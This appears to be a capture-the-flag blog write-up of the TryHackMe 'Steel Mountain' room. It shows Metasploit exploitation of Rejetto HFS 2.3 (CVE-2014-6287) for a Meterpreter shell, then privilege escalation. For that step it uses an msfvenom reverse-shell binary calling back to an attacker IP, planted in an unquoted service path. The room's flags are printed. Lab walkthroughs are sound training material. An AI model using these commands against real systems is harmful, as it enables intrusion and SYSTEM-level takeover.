---
layout: post
title: "THM: Steel Mountain — HFS & Unquoted Service Path"
date: 2026-02-22
categories: [thm, writeup]
tags: [windows, hfs, rejetto, metasploit, unquoted-service-path, privesc]
platform: "TryHackMe"
difficulty: "Easy"
---

**Machine:** Steel Mountain | **OS:** Windows | **Platform:** TryHackMe | **Difficulty:** Easy

Steel Mountain is a beginner-friendly Windows box themed around the TV show *Mr. Robot*. It involves exploiting a vulnerable file server (HFS 2.3) and escalating privileges via an unquoted service path.

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- --min-rate 5000 -oN steel.nmap 10.10.x.x
```

Key findings:

```
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
8080/tcp  open  http               HttpFileServer httpd 2.3
3389/tcp  open  ms-wbt-server      Microsoft Terminal Services
```

### Web Enumeration

Navigating to `http://10.10.x.x:8080` reveals **HFS (HTTP File Server) 2.3** — a known vulnerable version.

```bash
searchsploit hfs 2.3
```

```
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution
EDB-ID: 39161
```

---

## Foothold

### CVE-2014-6287 — Rejetto HFS RCE

Rejetto HFS 2.3 is vulnerable to remote command execution via a null-byte bypass in the search functionality. The application passes user-supplied input to `cmd.exe`.

**Using Metasploit:**

```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOST 10.10.x.x
set RPORT 8080
set LHOST 10.14.x.x
set LPORT 4444
run
```

```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: STEELMOUNTAIN\bill
```

We have a shell as `bill`.

### User Flag

```bash
meterpreter > cat "C:\Users\bill\Desktop\user.txt"
# b04763b6fcf51fcd7c13abc7db4fd365
```

---

## Privilege Escalation

### Enumeration with PowerUp

Upload and execute PowerUp.ps1 to enumerate privesc vectors:

```bash
meterpreter > upload PowerUp.ps1 .
meterpreter > load powershell
meterpreter > powershell_execute "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

Key output:

```
ServiceName    : AdvancedSystemCare9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCare9' -Path <HijackPath>
CanRestart     : True
```

The `AdvancedSystemCare9` service has an **unquoted service path** and runs as `SYSTEM`. We can drop a malicious binary in the path.

### Exploitation

Generate a reverse shell executable:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.x.x LPORT=9999 \
  -e x86/shikata_ga_nai -f exe -o Advanced.exe
```

Upload and place in the path, then restart the service:

```bash
meterpreter > upload Advanced.exe "C:\Program Files (x86)\IObit\Advanced.exe"
meterpreter > shell
sc stop AdvancedSystemCare9
sc start AdvancedSystemCare9
```

On our listener:

```bash
nc -lvnp 9999
# whoami
# nt authority\system
```

### Root Flag

```bash
type C:\Users\Administrator\Desktop\root.txt
# 9af5f314f57607c00fd09803a587db80
```

---

## Lessons Learned

1. **Always check service versions** — HFS 2.3 is trivially exploitable via public exploits.
2. **Unquoted service paths** are a classic Windows privesc — always check with PowerUp or WinPEAS.
3. **Services running as SYSTEM** with writable paths in their unquoted service path = instant privesc.
4. **PowerUp.ps1** is an excellent tool for automated Windows privilege escalation enumeration.

---

*This writeup documents a TryHackMe room for educational purposes.*
